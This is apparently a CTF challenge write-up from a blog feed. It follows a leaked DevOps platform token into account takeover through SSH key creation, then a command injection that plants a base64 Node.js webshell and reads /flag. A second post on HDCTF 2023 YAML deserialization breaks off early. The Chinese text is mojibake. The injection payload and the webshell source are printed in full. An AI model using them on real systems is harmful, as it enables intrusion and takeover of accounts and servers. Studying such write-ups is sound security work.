class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> coding = <span class="built_in">require</span>(<span class="string">&#x27;../../../request/coding&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> distExtname = [</span><br><span class="line">    <span class="string">&#x27;.tgz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.exe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.dmg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.AppImage&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">get</span>(<span class="params">request, response</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">ProjectId</span> = <span class="title class_">Number</span>(request.<span class="property">params</span>.<span class="property">ProjectId</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> data = []</span><br><span class="line"><span class="comment">// post to ä¸€ä¸ªåç«¯ </span></span><br><span class="line">        <span class="keyword">const</span> storeList = (<span class="keyword">await</span> coding.<span class="title function_">post</span>(<span class="string">&#x27;/open-api&#x27;</span>, &#123;</span><br><span class="line">            <span class="title class_">Action</span>: <span class="string">&#x27;DescribeProjectDepotInfoList&#x27;</span>,</span><br><span class="line">            <span class="title class_">ProjectId</span>,</span><br><span class="line">        &#125;)).<span class="property">data</span>.<span class="property">Response</span>.<span class="property">DepotData</span>.<span class="property">Depots</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> store <span class="keyword">of</span> storeList) &#123;</span><br><span class="line">            <span class="keyword">const</span> versionList = (<span class="keyword">await</span> coding.<span class="title function_">post</span>(<span class="string">&#x27;/open-api&#x27;</span>, &#123;</span><br><span class="line">                <span class="title class_">Action</span>: <span class="string">&#x27;DescribeGitReleases&#x27;</span>,</span><br><span class="line">                <span class="title class_">DepotId</span>: <span class="title class_">Number</span>(store.<span class="property">Id</span>),</span><br><span class="line">                <span class="title class_">Status</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="title class_">PageNumber</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="title class_">PageSize</span>: <span class="number">100</span>,</span><br><span class="line">            &#125;)).<span class="property">data</span>.<span class="property">Response</span>.<span class="property">ReleasePageList</span>.<span class="property">Releases</span></span><br><span class="line"></span><br><span class="line">            data = [...data, ...versionList]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.<span class="property">TagName</span> &lt; b.<span class="property">TagName</span> ? <span class="number">1</span> : -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        response.<span class="title function_">setData</span>(data)</span><br><span class="line">        response.<span class="title function_">success</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°ä»–æ˜¯å¦ä¸€ä¸ªåç«¯ api çš„ä»£ç† è€Œé‚£ä¸ªåç«¯å®šä¹‰åœ¨ request/coding ä¸­</p><h3 id="è·å¾—-token"><a href="#è·å¾—-token" class="headerlink" title="è·å¾— token"></a>è·å¾— token</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›¸å¯¹çš„è·¯å¾„å¾—åˆ° url </p><p>è®¿é—® <a href="http://127.0.0.1/request/coding.js">http://127.0.0.1/request/coding.js</a> ä¸­è·å–</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Access Token</span></span><br><span class="line"><span class="keyword">const</span> codingToken = <span class="string">&#x27;token e(This_Is_real_Token)c&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> coding = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">baseURL</span>: <span class="string">&#x27;https://e.coding.net&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="title class_">Authorization</span>: codingToken,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = coding</span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šæœç´¢ e.coding.net  å‘ç°æ˜¯ä¸€ä¸ª devops å¹³å° å…·æœ‰ç›¸å½“çš„åˆ©ç”¨ä»·å€¼</p><p>åŒæ—¶è¿™é‡Œä¹Ÿæš´éœ²äº† å¯¹åº”çš„ Token</p><h3 id="æ¥ç®¡ç”¨æˆ·è´¦æˆ·"><a href="#æ¥ç®¡ç”¨æˆ·è´¦æˆ·" class="headerlink" title="æ¥ç®¡ç”¨æˆ·è´¦æˆ·"></a>æ¥ç®¡ç”¨æˆ·è´¦æˆ·</h3><p>è¿›ä¸€æ­¥ä½¿ç”¨æœç´¢å¼•æ“å¯ä»¥å‘ç°å¯¹åº”çš„ openapi æ–‡æ¡£ <a href="https://coding.net/help/openapi">https://coding.net/help/openapi</a></p><blockquote><p>å¦‚æœå‘ç°äº†é¡¹ç›® <a href="https://github.com/Esonhugh/tencent-coding-openapi/">https://github.com/Esonhugh/tencent-coding-openapi/</a></p><p>è¿™é‡Œæä¾›äº†éå¸¸æ–¹ä¾¿çš„åˆ©ç”¨å·¥å…· å¯ä»¥ä¸€é”®åˆ—å‡ºé¡¹ç›®å’Œä»“åº“ å¹¶ä¸”å¯ä»¥å¢åŠ  ssh keys åªéœ€è¦å¯¼å…¥ä¸€ä¸ª api token å³å¯ã€‚</p></blockquote><p>å‘ç°æ˜¯ä¸ªäºº api ï¼ˆtoken å¼€å¤´ï¼‰</p><p>åˆ—å‡ºé¡¹ç›®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;DescribeCodingProjects&quot;,</span></span><br><span class="line"><span class="string">  &quot;PageNumber&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;PageSize&quot;: 10</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py list_projects</span><br><span class="line">ic| r.status_code: 200</span><br><span class="line">ic| r.headers: Headers(&#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;Nginx&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;Mon, 17 Apr 2023 11:04:54 GMT&#x27;</span>, <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;transfer-encoding&#x27;</span>: <span class="string">&#x27;chunked&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;content-encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;x-target-env&#x27;</span>: <span class="string">&#x27;prod_with_canary&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;RequestId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10bcd5a9-7d9a-4a80-a1ec-e833d4c89d77&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;PageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PageSize&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;TotalCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;ProjectList&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="number">11680350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;CreatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157689000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;UpdatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157689000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;MaxMember&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-token-leak-git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;DisplayName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak my git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wow! you got there! SuperCool man!&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://e.coding.net/static/project_icon/scenery-version-2-10.svg&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;TeamOwnerId&quot;</span><span class="punctuation">:</span> <span class="number">3921812</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;UserOwnerId&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;StartDate&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;EndDate&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;TeamId&quot;</span><span class="punctuation">:</span> <span class="number">3921812</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;IsDemo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Archived&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProgramIds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>åˆ—å‡ºä»“åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;DescribeProjectDepotInfoList&quot;,</span></span><br><span class="line"><span class="string">  &quot;ProjectId&quot;: 11414022</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py list_repos   </span><br><span class="line">ic| r.status_code: 200</span><br><span class="line">ic| r.headers: Headers(&#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;Nginx&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;Mon, 17 Apr 2023 11:04:00 GMT&#x27;</span>, <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;transfer-encoding&#x27;</span>: <span class="string">&#x27;chunked&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;content-encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;x-target-env&#x27;</span>: <span class="string">&#x27;prod_with_canary&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;RequestId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1b4dee8f-afce-4495-8e8b-d776c8097397&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DepotData&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Depots&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="number">10467875</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-source-code&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;HttpsUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://e.coding.net/vuln-git/leak-token-leak-git/leak-source-code.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProjectId&quot;</span><span class="punctuation">:</span> <span class="number">11680350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;SshUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@e.coding.net:vuln-git/leak-token-leak-git/leak-source-code.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;WebUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://vuln-git.coding.net/p/leak-token-leak-git/d/leak-source-code&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;VcsType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProjectName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-token-leak-git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Got there!&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;CreatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157728000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;LastPushAt&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Page&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;PageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PageSize&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;TotalPage&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;TotalRow&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å‘ç°è¦ç™»é™† å°è¯•è·å– sshkey</p><p>åˆ›å»º sshkey</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;CreateSshKey&quot;,</span></span><br><span class="line"><span class="string">  &quot;Title&quot;: &quot;Hacker&quot;,</span></span><br><span class="line"><span class="string">  &quot;Content&quot;: &quot;ssh-rsa AAAA== rsatest&quot;,</span></span><br><span class="line"><span class="string">  &quot;ExpirationDate&quot;: &quot;9999-12-31&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py add_ssh_key sshkey.rsa</span><br></pre></td></tr></table></figure><p>æˆåŠŸå <code>git clone git@e.coding.net:XXXXX/XXXX/XXXX.git</code></p><h3 id="é¡¹ç›®æºä»£ç "><a href="#é¡¹ç›®æºä»£ç " class="headerlink" title="é¡¹ç›®æºä»£ç "></a>é¡¹ç›®æºä»£ç </h3><p>è¿›è¡Œå®¡è®¡ã€‚ æŠŠèµ·æ¥é¡¹ç›®è·‘èµ·æ¥ã€‚</p><p>å¯ä»¥åœ¨ api æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°ä¸€ä¸ª /v3/UpdateAllProduct.js æ–‡ä»¶ è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ api åœ¨ html ä¸»é¡µä¸­å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶æ³„æ¼ã€‚</p><p>å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„å¯èƒ½ æ³¨å…¥éå¸¸çš„ç®€å• projectName ä¹‹ç±»çš„å‚æ•°éƒ½å¯ä»¥æ³¨å…¥ å› ä¸ºè¿™äº›æ˜¯ç›´æ¥æ‹¼æ¥è¿›å»çš„ã€‚</p><blockquote><p>æ­£å¼çš„é¢˜ç›®ç¯å¢ƒåº”è¯¥æ˜¯ç¦æ­¢åå‘ shell è¿æ¥å‡ºæ¥çš„</p><p>ç¬¬ä¸€ç§åŠæ³•æ˜¯çº¯ç²¹çš„æ— å›æ˜¾çš„å¸ƒå°”å‘½ä»¤æ³¨å…¥</p><p>ä½†æ˜¯è¿™é‡Œæ»¥ç”¨ä¸€ä¸‹ä»£ç ä¸­çš„å­˜åœ¨çš„ js CGI é­”æ³• æˆ‘ä»¬å¯ä»¥å°è¯•å†™å…¥ä¸€ä¸ª webshell js æ¥è¿›è¡Œ Getshell </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">use as curl</span></span><br><span class="line">curl &quot;https://127.0.0.1/v3/UpdateAllProduct&quot; \</span><br><span class="line">         -H &#x27;x-coding-event: ping1&#x27; \</span><br><span class="line">         -X POST -k \</span><br><span class="line">         --data-raw &quot;artifact.artifactRepoName=12&amp;artifact.artifactPkgName=\&quot;;echo $&#123;BASE64WEBSHELL&#125;|base64 -d &gt; /app/api/v2/badWebShell.js #\&quot;&amp;artifact.artifactVersionName=1.4&amp;artifact.projectName=testing&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python usage</span></span><br><span class="line">python digging-shell.py upload_shell ./upload_shell.js https://nodejs-hack.cloud.eson.ninja </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://nodejs-hack.cloud.eson.ninja replace your url ä¸è¦åŠ  / æˆ‘çš„æœåŠ¡æ˜¯ç¦æ­¢nodejs å¤–è¿å…¶ä»–æœåŠ¡ æ‰€ä»¥ä¼šå¯¼è‡´å†…éƒ¨çš„jsçš„å‘½ä»¤æ‹¼æ¥æ‰§è¡Œæ—¶å€™çš„ curl å¤±æ•ˆï¼Œå¯¼è‡´ä¸€æ¬¡ 500 ï¼Œå¦åˆ™ä¼šè¿”å›æœåŠ¡æ­£å¸¸æ›´æ–°çš„ json</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">output like following</span></span><br><span class="line">ic| file_data: &#x27;Y29uc3&lt;base64ed file data&gt;AAA=&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">.....</span><br><span class="line">httpx.ReadTimeout: The read operation timed out</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ BASE64WEBSHELL çš„å€¼ä¸º js webshell çš„æ ·æœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line">const &#123; execSync &#125; = require(&#x27;child_process&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    // API POST</span><br><span class="line">    async post(request, response) &#123;</span><br><span class="line">        // console.log(request.params)</span><br><span class="line">        artifactPkgName = request.params.artifactPkgName</span><br><span class="line">        // Save Path</span><br><span class="line">        const localDir = __dirname</span><br><span class="line">        // curl command</span><br><span class="line">        const curlCMD = artifactPkgName</span><br><span class="line">        // Create Path</span><br><span class="line">        fs.mkdirSync(localDir, &#123; recursive: true &#125;)</span><br><span class="line">        // download artificate</span><br><span class="line">        ResponseData = execSync(curlCMD, &#123; cwd: localDir &#125;).toString()</span><br><span class="line">        // Response</span><br><span class="line">        response.success(ResponseData)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äº pm2 ä¼šè‡ªåŠ¨æ‰˜ç®¡å’ŒåŠ è½½ api æ–‡ä»¶å¤¹ä¸‹çš„ js æ–‡ä»¶ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—® webshell</p><p>webshell é“¾æ¥åœ°å€ä¸º <a href="https://127.0.0.1/v2/badWebShell">https://127.0.0.1/v2/badWebShell</a> è¯·æ±‚æ–¹å¼ä¸º POST </p><p>POST Form çš„å†…å®¹ä¸º â€˜artifactPkgName={CMD}â€™</p><p>å‚è€ƒ check-shell å‡½æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python ./digging-shell.py get_shell https://nodejs-hack.cloud.eson.ninja <span class="built_in">ls</span> <span class="comment"># replace ls as your command. and replace https://nodejs-hack.cloud.eson.ninja as your url and also no / behind.</span></span><br><span class="line">ic| <span class="built_in">command</span>: <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">ic| resp.status_code: 200</span><br><span class="line">badWebShell.js</span><br><span class="line">coding</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>æ‹¿åˆ° webshell ä¹‹å cat /flag å³å¯æ‹¿åˆ° flag</p><blockquote><p>flag æ˜¯ mount è¿›å…¥å®¹å™¨è¿›ç¨‹ä¸­çš„ ä¸è¦æ”¾åˆ° /app ç›®å½•ä¸‹å³å¯</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF-2023-WEB</title>
      <link href="/posts/5f20f300.html"/>
      <url>/posts/5f20f300.html</url>
      
        <content type="html"><![CDATA[<p><strong>è¿™é‡Œçš„è¯æ˜¯åªè®°å½•è‡ªå·±ä¸ä¼šçš„çŸ¥è¯†ç‚¹</strong></p><h2 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p><img src="../images/image-20230423142920377.png" alt="image-20230423142920377"></p><p>è¿™æ˜¯ä¸€ä¸ªè€ƒç‚¹ï¼Œè€ƒæŸ¥çš„æ˜¯yaml çš„pythonååºåˆ—åŒ–</p><p><a href="https://xz.aliyun.com/t/7923">å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« æ¥äº†è§£ä¸€ä¸‹YAML</a></p><p><a href="https://xz.aliyun.com/t/11082#toc-11">Pythonååºåˆ—åŒ–æ¼æ´åˆ†æ</a></p><p>è¿™é‡Œçš„è¯å°±æ˜¯ä¸€å…±æœ‰ä¸‰ç§pythonååºåˆ—åŒ–ç±»å‹</p><p><strong>pickle YAML Marshal </strong> </p><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p><img src="../images/image-20230423145759804.png" alt="image-20230423145759804"></p><p>è¿™é‡Œçš„è¯æœ‰ä¸‰ä¸ªé€‰é¡¹å¯ä»¥è¿›å»è¿›è¡ŒæŸ¥çœ‹ï¼Œç„¶åç‚¹è¿›Read somethingä¼šå‘ç°ä»–çš„urlæ˜¯å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–çš„</p><p><img src="../images/image-20230423150002768.png" alt="image-20230423150002768"></p><p>äºæ˜¯è¿›è¡Œå°è¯•ï¼Œè¿™é‡Œçš„è¯ç›´æ¥è¯»æ–‡ä»¶çš„æ˜¯è¯»å–ä¸äº†çš„ï¼Œå¾—éœ€è¦ç”¨<code>file</code>ä¼ªåè®®æ¥è¿›è¡Œè¯»å–</p><p><img src="../images/image-20230423150317306.png" alt="image-20230423150317306"></p><p>æˆåŠŸè¿›è¡Œè¯»å–</p><p>ä½†æ˜¯è¿™é‡Œä¸çŸ¥é“flagåç§°ï¼Œæ‰€ä»¥ä¸èƒ½è¿›è¡Œè¯»å–ï¼Œä½†æ˜¯èƒ½å¯ä»¥å°è¯•è¯»å–ä¸€ä¸‹ç¯å¢ƒå˜é‡</p><p><strong>é‚£ä¹ˆè¿™å°±æ˜¯éé¢„æœŸè§£äº†</strong></p><p><img src="../images/image-20230423150830780.png" alt="image-20230423150830780"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 